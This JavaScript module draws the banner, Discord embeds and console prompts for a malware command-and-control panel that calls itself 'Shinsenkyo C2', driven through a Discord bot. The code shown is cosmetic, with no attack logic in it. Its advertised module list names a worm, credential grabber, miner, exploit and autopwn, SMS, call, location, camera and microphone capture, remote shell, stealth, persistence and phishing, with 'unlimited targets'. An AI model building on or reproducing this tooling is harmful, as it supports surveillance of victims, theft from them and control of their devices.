import { smallCaps, mono, createBox, A, C, E, ts, clockText, DEV_CMDS } from './utils/index.js'
import { EmbedBuilder } from 'discord.js'

const VERSION = '3.1'

const ASCII_LOGO = [
  '',
  '      ╔══════════════════════════════════╗',
  '      ║     ⛩️  SHINSENKYO  C2  🌸       ║',
  '      ║   *where even paradise bleeds*   ║',
  '      ╚══════════════════════════════════╝',
  '',
  '      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓',
  '      ▓  🗡️  🌸  ⚡  🌿  ⛩️  🗡️  🌸  ⚡  🌿  ▓',
  '      ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓',
  ''
].join('\n')

const TAGLINE = `"${mono('Paradise is just another name for a place where you have nothing left to lose.')}"`
const MODULES = [
  '+ ── ──=[   worm      brain     inject    config    ai       ]',
  '+ ── ──=[   grabber   miner     stream    exploit   autopwn  ]',
  '+ ── ──=[   contacts  sms       calls     location  wifi     ]',
  '+ ── ──=[   screens   camera    mic       shell     files    ]',
  '+ ── ──=[   stealth   persist   admin     overlay   phish    ]',
  '+ ── ──=[   ${DEV_CMDS?.size ?? 130}+ commands  |  unlimited targets  |  24/7 C2  ]',
].join('\n')

export function bannerCard() {
  const ascii = `\`\`\`ansi\n${A.brightCyan}${ASCII_LOGO}${A.reset}\`\`\``
  const info = createBox(
    `${A.brightCyan}${smallCaps('shinsenkyo command & control')}${A.reset}\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.green}VERSION${A.reset}    : ${A.brightRed}${VERSION}${A.reset} ─ ${A.grey}elixir${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.green}STATUS${A.reset}     : ${A.brightGreen}● TAO FLOW${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.green}DOMAIN${A.reset}     : shinsenkyo.c2 / discord gateway\n` +
    `${A.cyan}┃${A.reset} ${A.green}COMMANDS${A.reset}   : 130+  |  ${A.grey}!help for full grimoire${A.reset}\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.grey}${TAGLINE}${A.reset}\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.cyan}┃${A.reset} ${A.grey}${MODULES.split('\n').join(`\n${A.cyan}┃${A.reset} ${A.grey}`)}${A.reset}\n` +
    `${A.cyan}┃${A.reset}\n` +
    `${A.green}🌸 ${clockText()}${A.reset}`,
    'neon', 64
  )
  return { ascii, box: info }
}

export function novaEmbed(title, status = 'info', desc = '', opts = {}) {
  const color = C[status] || C.blood
  const e = new EmbedBuilder()
    .setColor(color)
    .setTitle(title)
    .setDescription(desc)
    .setFooter({ text: opts.footer || `🌸  ${ts()}  ─────────────────`, iconURL: opts.footerIcon || undefined })
  if (opts.thumb) e.setThumbnail(opts.thumb)
  if (opts.image) e.setImage(opts.image)
  if (opts.fields) e.addFields(opts.fields)
  if (opts.author) e.setAuthor(opts.author)
  if (opts.timestamp) e.setTimestamp()
  return { embeds: [e] }
}

export function novaLogoEmbed(status = 'online', extra = '') {
  const { ascii, box } = bannerCard()
  const total = extra || ''
  return novaEmbed(`${E.torii}  S H I N S E N K Y O  C 2  ${E.sakura}`, status,
    `${ascii}\`\`\`ansi\n${box}\n\`\`\`\n${total}`,
    { footer: `🌸  ${ts()}  ─────────────────`, thumb: undefined, noImage: true })
}

export function consoleLine(cmd, args = '', desc = '', style = 'cyan') {
  const colors = { cyan: A.cyan, red: A.red, green: A.green, yellow: A.yellow, magenta: A.magenta, grey: A.grey }
  const c = colors[style] || A.cyan
  return `${A.brightGreen}tao${A.reset} > ${c}!${cmd}${args ? ' ' + args : ''}${A.reset}  ${A.grey}${desc}${A.reset}`
}
